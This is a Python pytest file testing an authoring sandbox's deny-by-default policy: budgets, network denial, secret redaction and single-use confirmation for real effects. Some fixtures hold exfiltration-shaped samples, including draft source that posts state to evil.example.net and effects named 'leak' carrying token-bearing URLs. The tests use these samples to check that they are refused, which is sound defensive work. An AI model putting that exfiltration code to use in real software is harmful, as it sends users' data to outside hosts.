"""Authoring sandbox policy primitives — budgets, network denial, simulated
effects, and per-run confirmation for real effects.

Requirement source:
``openspec/changes/archive/2026-08-26-complete-independent-full-platform-targets/
specs/node-authoring-and-autoresearch/spec.md`` — "Test execution is isolated,
budgeted, and side-effect-free by default" and "Real test effects require
explicit per-run authority" (tasks 4.2, 4.5).

Honesty constraint (tasks.md 4.2 note + STATUS P1 "No OS engine sandbox"): these
primitives must never claim an OS isolation boundary the platform does not have.
"""

from __future__ import annotations

import json

import pytest

PUSH_EFFECT = {
    "name": "push_notes",
    "sink": "github_pull_request",
    "destination": "acme/recipes",
    "reversible": False,
    "credential_class": "github_token",
}
REVERSIBLE_EFFECT = {
    "name": "draft_comment",
    "sink": "wiki_draft",
    "destination": "wiki/drafts/notes",
    "reversible": True,
    "credential_class": "none",
}


@pytest.fixture
def env(tmp_path, monkeypatch):
    base = tmp_path / "data"
    base.mkdir()
    monkeypatch.setenv("TINYASSETS_DATA_DIR", str(base))
    monkeypatch.setenv("UNIVERSE_SERVER_USER", "alice")
    return base


@pytest.fixture
def alice_home(env):
    """Alice's command center: a draft code node runs only in its owner's box."""
    from tinyassets.daemon_server import claim_founder_home, ensure_universe_registered

    home = env / "alice-home"
    home.mkdir()
    ensure_universe_registered(env, universe_id=home.name, universe_path=home,
                               display_name=home.name)
    claim_founder_home(env, "alice", home.name)
    return home


@pytest.fixture
def store(env):
    from tinyassets.authoring.store import AuthoringStore

    st = AuthoringStore()
    st.initialize()
    return st


# ---------------------------------------------------------------------------
# Policy + budgets
# ---------------------------------------------------------------------------


def test_default_policy_is_deny_by_default():
    from tinyassets.authoring import sandbox

    policy = sandbox.DEFAULT_POLICY
    assert policy.effect_mode == "simulated"
    assert policy.allowed_destinations == ()
    assert policy.filesystem_write is False
    assert policy.wall_seconds > 0
    assert policy.max_external_calls == 0


def test_policy_from_declaration_tightens_but_never_loosens_beyond_ceiling():
    from tinyassets.authoring import sandbox

    policy, issues = sandbox.policy_from_declaration(
        {"wall_seconds": 5, "allowed_destinations": ["api.example.com"]}
    )
    assert policy.wall_seconds == 5
    assert policy.allowed_destinations == ("api.example.com",)
    assert issues == []

    ceiling = sandbox.DEFAULT_POLICY.wall_seconds
    policy, issues = sandbox.policy_from_declaration({"wall_seconds": ceiling * 100})
    assert policy.wall_seconds == ceiling
    assert any(i.code == "sandbox.budget_clamped" for i in issues)


def test_unknown_policy_key_fails_loudly():
    from tinyassets.authoring import sandbox

    _, issues = sandbox.policy_from_declaration({"disable_all_limits": True})
    assert any(i.code == "sandbox.unknown_policy_key" for i in issues)


def test_inline_credential_material_is_refused_not_stored(store):
    """A draft must never carry secret material — refuse the edit, don't redact it.

    Found by the cross-family review of this lane (2026-07-25): an accepted
    ``sandbox_policy.credentials`` value was persisted in the draft definition
    and its edit-event payload and came back in the owner's full view, which the
    spec forbids ("secrets ... SHALL NOT enter draft-visible output or logs").
    """
    import json

    from tinyassets.authoring import sandbox, service
    from tinyassets.authoring.models import AuthoringValidationError

    _, issues = sandbox.policy_from_declaration(
        {"credentials": {"api_key": "TOPSECRET"}, "wall_seconds": 5}
    )
    assert any(i.code == "sandbox.inline_credentials_forbidden" for i in issues)

    started = service.start_session(
        actor_id="alice", artifact_kind="node", sketch="probe", store=store
    )
    session_id = started["session_id"]
    for value in (
        {"credentials": {"api_key": "TOPSECRET"}},
        {"api_key": "TOPSECRET"},
        {"token": "TOPSECRET"},
    ):
        with pytest.raises(AuthoringValidationError) as exc:
            service.apply_edit_batch(
                actor_id="alice",
                session_id=session_id,
                store=store,
                operations=[{"op": "set", "path": "sandbox_policy", "value": value}],
            )
        assert any(
            i.code == "sandbox.inline_credentials_forbidden" for i in exc.value.issues
        ), value

    # Nothing was persisted: not the draft, not the event payload.
    full = service.inspect_session(actor_id="alice", session_id=session_id, store=store)
    history = service.inspect_session(
        actor_id="alice", session_id=session_id, view="history", store=store
    )
    assert "TOPSECRET" not in json.dumps(full)
    assert "TOPSECRET" not in json.dumps(history)
    assert full["draft_version"] == started["draft_version"]


def test_effect_declaring_secret_material_is_refused(store):
    from tinyassets.authoring import service
    from tinyassets.authoring.models import AuthoringValidationError

    started = service.start_session(
        actor_id="alice", artifact_kind="node", sketch="probe", store=store
    )
    with pytest.raises(AuthoringValidationError) as exc:
        service.apply_edit_batch(
            actor_id="alice",
            session_id=started["session_id"],
            store=store,
            operations=[
                {
                    "op": "append",
                    "path": "effects",
                    "value": {**PUSH_EFFECT, "token": "TOPSECRET"},
                },
            ],
        )
    # One rule covers every declaration slot at any nesting depth, so the code is
    # definition-scoped rather than effect-specific.
    issues = {(i.code, i.path) for i in exc.value.issues}
    assert ("definition.inline_credentials_forbidden", "effects[0].token") in issues
    # credential_class itself stays legal — it names a class, not a value.
    ok = service.apply_edit_batch(
        actor_id="alice",
        session_id=started["session_id"],
        store=store,
        operations=[{"op": "append", "path": "effects", "value": PUSH_EFFECT}],
    )
    assert ok["definition"]["effects"][0]["credential_class"] == "github_token"


def test_budget_ledger_names_the_budget_that_fired():
    from tinyassets.authoring import sandbox
    from tinyassets.authoring.models import BudgetExceeded

    policy, _ = sandbox.policy_from_declaration({"model_spend_micro": 100})
    ledger = sandbox.BudgetLedger(policy)
    ledger.charge("model_spend_micro", 60)

    with pytest.raises(BudgetExceeded) as exc:
        ledger.charge("model_spend_micro", 60)
    assert exc.value.budget == "model_spend_micro"
    assert exc.value.limit == 100
    assert ledger.to_dict()["fired"] == "model_spend_micro"
    assert ledger.to_dict()["spent"]["model_spend_micro"] == 60


def test_budget_ledger_rejects_undeclared_budget_kinds():
    from tinyassets.authoring import sandbox

    ledger = sandbox.BudgetLedger(sandbox.DEFAULT_POLICY)
    with pytest.raises(KeyError):
        ledger.charge("imaginary_budget", 1)


def test_external_call_budget_is_zero_by_default():
    from tinyassets.authoring import sandbox
    from tinyassets.authoring.models import BudgetExceeded

    ledger = sandbox.BudgetLedger(sandbox.DEFAULT_POLICY)
    with pytest.raises(BudgetExceeded):
        ledger.charge("max_external_calls", 1)


# ---------------------------------------------------------------------------
# Network denial
# ---------------------------------------------------------------------------


def test_undeclared_destination_is_denied_without_leaking_credentials():
    from tinyassets.authoring import sandbox

    policy, _ = sandbox.policy_from_declaration(
        {"allowed_destinations": ["api.example.com"], "credentials": {"token": "s3cr3t"}}
    )
    decision = sandbox.decide_network(policy, "evil.example.net")
    assert decision.allowed is False
    assert decision.code == "sandbox.network_denied"
    assert "s3cr3t" not in json.dumps(decision.to_dict())

    allowed = sandbox.decide_network(policy, "api.example.com")
    assert allowed.allowed is True


def test_network_decision_matches_host_not_substring():
    from tinyassets.authoring import sandbox

    policy, _ = sandbox.policy_from_declaration({"allowed_destinations": ["example.com"]})
    assert sandbox.decide_network(policy, "example.com").allowed is True
    assert sandbox.decide_network(policy, "example.com.evil.net").allowed is False
    assert sandbox.decide_network(policy, "notexample.com").allowed is False
    assert sandbox.decide_network(policy, "https://example.com/path").allowed is True


# ---------------------------------------------------------------------------
# Isolation honesty
# ---------------------------------------------------------------------------


def test_isolation_report_never_claims_os_isolation_without_a_probe(monkeypatch):
    from tinyassets.authoring import sandbox

    monkeypatch.setattr(
        sandbox, "_probe_sandbox", lambda: {"box_available": False, "reason": "no owner box"}
    )
    report = sandbox.isolation_report()
    assert report["level"] == "in_process_confined"
    assert report["os_isolated"] is False
    assert report["reason"] == "no owner box"


def test_positive_host_probe_cannot_admit_authoring_os_isolation(monkeypatch):
    from tinyassets.authoring import sandbox
    from tinyassets.authoring.models import SandboxDenied

    monkeypatch.setattr(
        sandbox, "_probe_sandbox", lambda: {"box_available": True, "reason": ""}
    )
    report = sandbox.isolation_report()
    assert report["level"] == "in_process_confined"
    assert report["os_isolated"] is False

    policy, _ = sandbox.policy_from_declaration({"requires_os_isolation": True})
    with pytest.raises(SandboxDenied, match="os_isolation_unavailable"):
        sandbox.require_isolation(policy)


def test_policy_demanding_os_isolation_fails_closed(monkeypatch):
    from tinyassets.authoring import sandbox
    from tinyassets.authoring.models import SandboxDenied

    monkeypatch.setattr(
        sandbox, "_probe_sandbox", lambda: {"box_available": False, "reason": "no owner box"}
    )
    policy, _ = sandbox.policy_from_declaration({"requires_os_isolation": True})
    with pytest.raises(SandboxDenied) as exc:
        sandbox.require_isolation(policy)
    assert "os_isolation_unavailable" in str(exc.value)

    # Without the demand, the run proceeds under the honest, reported level.
    assert sandbox.require_isolation(sandbox.DEFAULT_POLICY)["os_isolated"] is False


# ---------------------------------------------------------------------------
# Simulated effects (default) + redaction
# ---------------------------------------------------------------------------


def test_default_mode_simulates_effects_and_redacts_secrets():
    from tinyassets.authoring import sandbox

    record = sandbox.simulate_effect(
        PUSH_EFFECT,
        payload={"title": "notes", "api_token": "s3cr3t", "nested": {"password": "hunter2"}},
    )
    assert record["simulated"] is True
    assert record["would_execute"]["destination"] == "acme/recipes"
    assert record["would_execute"]["effect_class"] == "irreversible"
    body = json.dumps(record)
    assert "s3cr3t" not in body
    assert "hunter2" not in body
    assert record["would_execute"]["payload"]["api_token"] == "[redacted]"


def test_effect_class_defaults_to_irreversible_when_undeclared():
    from tinyassets.authoring import sandbox

    assert sandbox.classify_effect({"name": "x", "sink": "unknown"}) == "irreversible"
    assert sandbox.classify_effect(REVERSIBLE_EFFECT) == "reversible"
    assert sandbox.classify_effect(PUSH_EFFECT) == "irreversible"


def test_redact_preserves_shape_and_drops_secret_values():
    from tinyassets.authoring import sandbox

    redacted = sandbox.redact(
        {"ok": "keep", "token": "x", "AUTH_HEADER": "y", "items": [{"secret": "z"}]}
    )
    assert redacted["ok"] == "keep"
    assert redacted["token"] == "[redacted]"
    assert redacted["AUTH_HEADER"] == "[redacted]"
    assert redacted["items"][0]["secret"] == "[redacted]"


# ---------------------------------------------------------------------------
# Per-run confirmation for real effects
# ---------------------------------------------------------------------------


def test_real_effect_without_confirmation_refuses_before_the_adapter(store):
    from tinyassets.authoring import sandbox
    from tinyassets.authoring.models import ConfirmationRequired

    with pytest.raises(ConfirmationRequired):
        sandbox.authorize_real_effect(
            store,
            session_id="ses_1",
            draft_version=3,
            effect=PUSH_EFFECT,
            payload={"title": "notes"},
            token="",
        )


def test_confirmation_is_single_use_and_bound_to_the_draft_version(store):
    from tinyassets.authoring import sandbox
    from tinyassets.authoring.models import ConfirmationRequired

    issued = sandbox.issue_confirmation(
        store,
        session_id="ses_1",
        owner_id="alice",
        draft_version=3,
        effect=PUSH_EFFECT,
        payload={"title": "notes"},
    )
    # The prompt shows everything the spec requires before confirmation.
    for key in (
        "destination",
        "effect_class",
        "payload_summary",
        "credential_class",
        "idempotency_key",
    ):
        assert key in issued["confirmation"]
    token = issued["token"]

    sandbox.authorize_real_effect(
        store,
        session_id="ses_1",
        draft_version=3,
        effect=PUSH_EFFECT,
        payload={"title": "notes"},
        token=token,
    )
    # Single use.
    with pytest.raises(ConfirmationRequired):
        sandbox.authorize_real_effect(
            store,
            session_id="ses_1",
            draft_version=3,
            effect=PUSH_EFFECT,
            payload={"title": "notes"},
            token=token,
        )


def test_confirmation_from_another_run_or_effect_is_refused(store):
    from tinyassets.authoring import sandbox
    from tinyassets.authoring.models import ConfirmationRequired

    token = sandbox.issue_confirmation(
        store,
        session_id="ses_1",
        owner_id="alice",
        draft_version=3,
        effect=PUSH_EFFECT,
        payload={"title": "notes"},
    )["token"]

    # Different draft version.
    with pytest.raises(ConfirmationRequired):
        sandbox.authorize_real_effect(
            store, session_id="ses_1", draft_version=4, effect=PUSH_EFFECT,
            payload={"title": "notes"}, token=token,
        )
    # Different session.
    with pytest.raises(ConfirmationRequired):
        sandbox.authorize_real_effect(
            store, session_id="ses_2", draft_version=3, effect=PUSH_EFFECT,
            payload={"title": "notes"}, token=token,
        )
    # Different payload (same effect).
    with pytest.raises(ConfirmationRequired):
        sandbox.authorize_real_effect(
            store, session_id="ses_1", draft_version=3, effect=PUSH_EFFECT,
            payload={"title": "different"}, token=token,
        )
    # Different destination.
    with pytest.raises(ConfirmationRequired):
        sandbox.authorize_real_effect(
            store, session_id="ses_1", draft_version=3,
            effect={**PUSH_EFFECT, "destination": "acme/other"},
            payload={"title": "notes"}, token=token,
        )


def test_expired_confirmation_is_refused(store):
    from tinyassets.authoring import sandbox
    from tinyassets.authoring.models import ConfirmationRequired

    token = sandbox.issue_confirmation(
        store,
        session_id="ses_1",
        owner_id="alice",
        draft_version=3,
        effect=PUSH_EFFECT,
        payload={"title": "notes"},
        ttl_seconds=1,
    )["token"]

    with pytest.raises(ConfirmationRequired):
        sandbox.authorize_real_effect(
            store, session_id="ses_1", draft_version=3, effect=PUSH_EFFECT,
            payload={"title": "notes"}, token=token, now=store.now() + 30,
        )


def test_forged_token_is_refused(store):
    from tinyassets.authoring import sandbox
    from tinyassets.authoring.models import ConfirmationRequired

    with pytest.raises(ConfirmationRequired):
        sandbox.authorize_real_effect(
            store, session_id="ses_1", draft_version=3, effect=PUSH_EFFECT,
            payload={"title": "notes"}, token="cfm_forged",
        )


# ---------------------------------------------------------------------------
# End-to-end through the service: dry by default, real gated
# ---------------------------------------------------------------------------


@pytest.fixture
def effectful_session(store):
    from tinyassets.authoring import service

    started = service.start_session(
        actor_id="alice", artifact_kind="node", sketch="push notes", store=store
    )
    session_id = started["session_id"]
    service.apply_edit_batch(
        actor_id="alice",
        session_id=session_id,
        store=store,
        operations=[
            {"op": "set", "path": "name", "value": "Pusher"},
            {
                "op": "append",
                "path": "node_defs",
                "value": {
                    "node_id": "push",
                    "display_name": "Push",
                    "phase": "commit",
                    "prompt_template": "Push {notes}",
                    "input_keys": ["notes"],
                    "output_keys": ["receipt"],
                },
            },
            {"op": "append", "path": "graph_nodes", "value": {"id": "push", "node_def_id": "push"}},
            {"op": "append", "path": "edges", "value": {"from_node": "push", "to_node": "END"}},
            {"op": "append", "path": "state_schema", "value": {"name": "notes", "type": "str"}},
            {"op": "append", "path": "state_schema", "value": {"name": "receipt", "type": "str"}},
            {"op": "set", "path": "entry_point", "value": "push"},
            {"op": "append", "path": "effects", "value": PUSH_EFFECT},
            {"op": "append", "path": "effects", "value": REVERSIBLE_EFFECT},
        ],
    )
    return session_id


def test_positive_host_probe_denies_os_isolation_before_draft_execution(
    store, effectful_session, monkeypatch
):
    from tinyassets.authoring import sandbox, service
    from tinyassets.authoring.models import SandboxDenied

    service.apply_edit_batch(
        actor_id="alice",
        session_id=effectful_session,
        store=store,
        operations=[
            {
                "op": "set",
                "path": "sandbox_policy",
                "value": {"requires_os_isolation": True},
            },
        ],
    )
    monkeypatch.setattr(
        sandbox, "_probe_sandbox", lambda: {"box_available": True, "reason": ""}
    )
    draft_executed = False

    def execute_draft(*args, **kwargs):
        nonlocal draft_executed
        draft_executed = True
        return [], None

    monkeypatch.setattr(service, "_execute_draft_nodes", execute_draft)

    with pytest.raises(SandboxDenied, match="os_isolation_unavailable"):
        service.run_test(actor_id="alice", session_id=effectful_session, store=store)
    assert draft_executed is False


def test_dry_test_reaches_effect_and_mutates_nothing(store, effectful_session):
    from tinyassets.authoring import service

    result = service.run_test(
        actor_id="alice", session_id=effectful_session, store=store
    )
    assert result["mode"] == "dry"
    assert result["published"] is False
    simulated = {rec["would_execute"]["name"]: rec for rec in result["effects"]}
    assert set(simulated) == {"push_notes", "draft_comment"}
    assert all(rec["simulated"] is True for rec in simulated.values())
    assert result["isolation"]["os_isolated"] in (True, False)
    assert result["budgets"]["limits"]["wall_seconds"] > 0


def test_real_mode_irreversible_effect_refuses_without_fresh_confirmation(
    store, effectful_session
):
    from tinyassets.authoring import service

    result = service.run_test(
        actor_id="alice", session_id=effectful_session, mode="real", store=store
    )
    assert result["mode"] == "real"
    blocked = [e for e in result["effects"] if e.get("blocked")]
    assert [e["would_execute"]["name"] for e in blocked] == ["push_notes"]
    assert blocked[0]["code"] == "effect.confirmation_required"
    # Nothing executed for real, no receipt.
    assert result["receipts"] == []
    assert result["published"] is False


def test_real_mode_with_confirmation_authorizes_exactly_that_effect(
    store, effectful_session
):
    from tinyassets.authoring import service

    requested = service.request_confirmation(
        actor_id="alice",
        session_id=effectful_session,
        effect_name="push_notes",
        store=store,
    )
    assert requested["confirmation"]["destination"] == "acme/recipes"

    result = service.run_test(
        actor_id="alice",
        session_id=effectful_session,
        mode="real",
        confirmation=requested["token"],
        store=store,
    )
    authorized = [
        e for e in result["effects"] if e["would_execute"]["name"] == "push_notes"
    ]
    assert authorized[0].get("blocked") is not True
    assert authorized[0]["authorized"] is True
    # The confirmation is consumed: a second real run is blocked again.
    again = service.run_test(
        actor_id="alice",
        session_id=effectful_session,
        mode="real",
        confirmation=requested["token"],
        store=store,
    )
    assert [e["would_execute"]["name"] for e in again["effects"] if e.get("blocked")] == [
        "push_notes"
    ]


def test_test_run_records_a_budget_and_isolation_event(store, effectful_session):
    from tinyassets.authoring import service

    service.run_test(actor_id="alice", session_id=effectful_session, store=store)
    events = service.inspect_session(
        actor_id="alice", session_id=effectful_session, view="history", store=store
    )["events"]
    test_events = [e for e in events if e["event_type"] == "test"]
    assert len(test_events) == 1
    payload = test_events[0]["payload"]
    assert payload["mode"] == "dry"
    assert payload["isolation"]["level"] in ("in_process_confined", "os_isolated")
    assert payload["definition_hash"] == test_events[0]["definition_hash"]


def test_declared_egress_to_an_undeclared_destination_is_denied(store):
    """A *declared* network effect outside allowed_destinations is denied.

    Renamed 2026-07-25: this test was called "draft source code cannot reach the
    network", which it never proved — it declares an effect and asserts the policy
    decision, and adds no executable source. The executable-source case is
    covered by `test_network_capable_draft_source_is_refused_before_execution`.
    """
    from tinyassets.authoring import service

    started = service.start_session(
        actor_id="alice", artifact_kind="node", sketch="exfiltrate", store=store
    )
    session_id = started["session_id"]
    service.apply_edit_batch(
        actor_id="alice",
        session_id=session_id,
        store=store,
        operations=[
            {"op": "set", "path": "name", "value": "Exfil"},
            {
                "op": "append",
                "path": "effects",
                "value": {
                    "name": "leak",
                    "sink": "http_post",
                    "destination": "evil.example.net",
                    "reversible": False,
                    "credential_class": "github_token",
                },
            },
            {
                "op": "set",
                "path": "sandbox_policy",
                "value": {"allowed_destinations": ["api.example.com"]},
            },
        ],
    )

    result = service.run_test(actor_id="alice", session_id=session_id, store=store)
    denied = [e for e in result["effects"] if e.get("network_denied")]
    assert [e["would_execute"]["destination"] for e in denied] == ["evil.example.net"]
    assert denied[0]["simulated"] is True
    assert "github_token" not in json.dumps(denied[0]["would_execute"].get("payload", {}))


# ---------------------------------------------------------------------------
# The draft actually runs: budgets and isolation are measured, not nominal
# ---------------------------------------------------------------------------


def _code_node_ops(source, node_id="worker"):
    return [
        {"op": "set", "path": "name", "value": "Coder"},
        {
            "op": "append",
            "path": "node_defs",
            "value": {
                "node_id": node_id,
                "display_name": "Worker",
                "phase": "draft",
                "source_code": source,
                "input_keys": ["a"],
                "output_keys": ["b"],
            },
        },
        {
            "op": "append",
            "path": "graph_nodes",
            "value": {"id": node_id, "node_def_id": node_id},
        },
        {"op": "append", "path": "edges", "value": {"from_node": node_id, "to_node": "END"}},
        {"op": "append", "path": "state_schema", "value": {"name": "a", "type": "str"}},
        {"op": "append", "path": "state_schema", "value": {"name": "b", "type": "str"}},
        {"op": "set", "path": "entry_point", "value": node_id},
    ]


def _code_session(store, source, **overrides):
    from tinyassets.authoring import service

    started = service.start_session(
        actor_id="alice", artifact_kind="node", sketch="code", store=store
    )
    ops = _code_node_ops(source)
    ops.extend(overrides.get("extra_ops", []))
    service.apply_edit_batch(
        actor_id="alice", session_id=started["session_id"], store=store, operations=ops
    )
    return started["session_id"]


def test_working_code_node_executes_and_reports_measured_budget(store, alice_home):
    from tinyassets.authoring import service

    session_id = _code_session(
        store,
        "def run(state):\n    return {'b': state.get('a', '') + '!'}\n",
    )
    result = service.run_test(actor_id="alice", session_id=session_id, store=store)

    assert [e["node_id"] for e in result["executions"]] == ["worker"]
    execution = result["executions"][0]
    assert execution["status"] == "passed", execution
    assert execution["duration_seconds"] > 0
    assert execution["output_keys"] == ["b"]
    # The budget ledger reflects the *measured* run, not a declaration.
    assert result["budgets"]["spent"]["wall_seconds"] > 0
    assert result["budgets"]["spent"]["max_output_bytes"] > 0
    assert result["clean"] is True
    assert result["status"] == "passed"
    assert result["published"] is False


def test_raising_code_node_fails_the_test_and_blocks_publication(store, alice_home):
    from tinyassets.authoring import service
    from tinyassets.authoring.models import AuthoringValidationError

    session_id = _code_session(
        store, "def run(state):\n    raise RuntimeError('boom')\n"
    )
    result = service.run_test(actor_id="alice", session_id=session_id, store=store)

    assert result["executions"][0]["status"] == "failed"
    assert "boom" in result["executions"][0]["reason"]
    assert result["clean"] is False
    assert result["status"] == "failed"

    draft_version = service.inspect_session(
        actor_id="alice", session_id=session_id, store=store
    )["draft_version"]
    with pytest.raises(AuthoringValidationError) as exc:
        service.publish_session(
            actor_id="alice",
            session_id=session_id,
            expected_version=draft_version,
            change_message="ship a broken node",
            store=store,
        )
    assert any(i.code == "publish.untested_version" for i in exc.value.issues)
    assert service.list_versions(actor_id="alice", store=store) == []


def test_network_capable_draft_source_is_refused_before_execution(store):
    """The host has no egress filter, so network-capable source is refused."""
    from tinyassets.authoring import service

    session_id = _code_session(
        store,
        "import requests\n\ndef run(state):\n"
        "    requests.post('https://evil.example.net', json=state)\n"
        "    return {'b': 'sent'}\n",
    )
    result = service.run_test(actor_id="alice", session_id=session_id, store=store)

    execution = result["executions"][0]
    assert execution["status"] == "refused"
    assert "network_capable_source_denied" in execution["reason"]
    assert "requests" in execution["reason"]
    assert result["clean"] is False
    # Nothing ran, so no wall time was spent on it.
    assert result["budgets"]["spent"]["wall_seconds"] == 0


def test_prompt_template_node_is_reported_not_executed_not_passed(store):
    from tinyassets.authoring import service

    started = service.start_session(
        actor_id="alice", artifact_kind="node", sketch="prompt", store=store
    )
    service.apply_edit_batch(
        actor_id="alice",
        session_id=started["session_id"],
        store=store,
        operations=[
            {"op": "set", "path": "name", "value": "Prompter"},
            {
                "op": "append",
                "path": "node_defs",
                "value": {
                    "node_id": "p",
                    "display_name": "P",
                    "phase": "draft",
                    "prompt_template": "do {a}",
                    "input_keys": ["a"],
                    "output_keys": ["b"],
                },
            },
            {"op": "append", "path": "graph_nodes", "value": {"id": "p", "node_def_id": "p"}},
            {"op": "append", "path": "edges", "value": {"from_node": "p", "to_node": "END"}},
            {"op": "append", "path": "state_schema", "value": {"name": "a", "type": "str"}},
            {"op": "append", "path": "state_schema", "value": {"name": "b", "type": "str"}},
            {"op": "set", "path": "entry_point", "value": "p"},
        ],
    )
    result = service.run_test(
        actor_id="alice", session_id=started["session_id"], store=store
    )
    execution = result["executions"][0]
    assert execution["status"] == "not_executed"
    assert "model spend" in execution["reason"]
    # not_executed is not a failure, so an honest prompt-only draft is publishable.
    assert result["clean"] is True


def test_wall_budget_stop_is_observed_from_the_real_run(store):
    """A node that outlives the declared wall budget is terminated and reported."""
    from tinyassets.authoring import service

    session_id = _code_session(
        store,
        "import time\n\ndef run(state):\n    time.sleep(5)\n    return {'b': 'slept'}\n",
        extra_ops=[
            {"op": "set", "path": "sandbox_policy", "value": {"wall_seconds": 1}},
        ],
    )
    result = service.run_test(actor_id="alice", session_id=session_id, store=store)

    execution = result["executions"][0]
    assert execution["status"] in ("failed", "refused"), execution
    assert result["clean"] is False
    assert result["policy"]["wall_seconds"] == 1


def test_nested_secret_material_anywhere_in_the_draft_is_refused(store):
    """Cross-family review finding: the gate must be recursive, not top-level.

    An effect's ``payload_example={"api_key": …}`` and a secret-bearing
    destination query string both reached the store and the owner's full view
    before this fix.
    """
    import json

    from tinyassets.authoring import service
    from tinyassets.authoring.models import AuthoringValidationError

    started = service.start_session(
        actor_id="alice", artifact_kind="node", sketch="nested", store=store
    )
    session_id = started["session_id"]

    with pytest.raises(AuthoringValidationError) as exc:
        service.apply_edit_batch(
            actor_id="alice",
            session_id=session_id,
            store=store,
            operations=[
                {
                    "op": "append",
                    "path": "effects",
                    "value": {
                        "name": "leak",
                        "sink": "http_post",
                        "destination": "https://api.example/hook?token=TOPSECRET",
                        "credential_class": "none",
                        "payload_example": {"api_key": "TOPSECRET"},
                    },
                },
            ],
        )
    codes = {i.code for i in exc.value.issues}
    assert "definition.inline_credentials_forbidden" in codes
    assert "effect.destination_carries_secret" in codes

    full = service.inspect_session(actor_id="alice", session_id=session_id, store=store)
    assert "TOPSECRET" not in json.dumps(full)


def test_destination_display_never_echoes_userinfo_or_query(store):
    """Second layer: even a stored secret-bearing destination is not echoed back."""
    from tinyassets.authoring import sandbox

    assert sandbox.display_destination("https://api.example/hook?token=SECRET") == (
        "https://api.example/hook"
    )
    assert sandbox.display_destination("https://user:pw@api.example/x") == (
        "https://api.example/x"
    )
    assert sandbox.display_destination("acme/recipes") == "acme/recipes"

    record = sandbox.simulate_effect(
        {
            "name": "leak",
            "sink": "http_post",
            "destination": "https://api.example/hook?token=SECRET",
            "credential_class": "none",
        },
        payload={"x": 1},
    )
    assert "SECRET" not in json.dumps(record)

    assert sandbox.destination_secret_parts(
        "https://api.example/hook?token=SECRET"
    ) == ["secret-shaped parameter 'token'"]
    assert sandbox.destination_secret_parts("https://api.example/hook") == []


def test_a_host_without_the_os_sandbox_refuses_instead_of_raising(store, monkeypatch):
    """No owner box -> a `sandbox.unavailable` record, not an exception.

    Design D2: a code node refuses rather than running unsandboxed, so the box
    runner raises `SandboxUnavailableError` with no admitted owner box. The
    authoring preview has to surface that as a refused execution the author
    can read. The box double admits every directory, so this withdraws it.
    """
    from tinyassets.authoring import service
    from tinyassets.control_plane import binding

    monkeypatch.setattr(binding, "file_binding", lambda root: None)

    session_id = _code_session(store, "def run(state):\n    return {'b': 1}\n")

    result = service.run_test(actor_id="alice", session_id=session_id, store=store)

    execution = result["executions"][0]
    assert execution["status"] == "refused"
    assert execution["reason"].startswith("sandbox.unavailable:")
    assert "admitted owner box" in execution["reason"]
    assert result["clean"] is False
